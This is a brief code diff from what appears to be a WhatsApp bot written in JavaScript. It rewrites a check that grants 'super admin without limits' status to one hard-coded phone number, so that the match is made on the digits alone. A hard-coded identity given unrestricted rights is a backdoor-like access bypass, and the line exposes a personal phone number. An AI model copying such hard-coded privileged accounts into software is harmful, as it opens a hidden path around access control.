@@ -434,7 +434,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 		const isUser = userActivity.includes(m.sender);
 		const isVip = db.data && db.data.users && db.data.users[m.sender] ? db.data.users[m.sender].vip : false;
 		const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
-		const isSuperAdmin = m.sender === '6285858850541@s.whatsapp.net'; // Super admin tanpa batasan
+		const isSuperAdmin = m.sender.replace(/[^0-9]/g, '') === '6285858850541'; // Super admin tanpa batasan
 		const isPremium = isCreator || checkPremiumUser(m.sender, premium);
 		expiredCheck(sock, m, premium);
 		checkSewaExpired(sock);
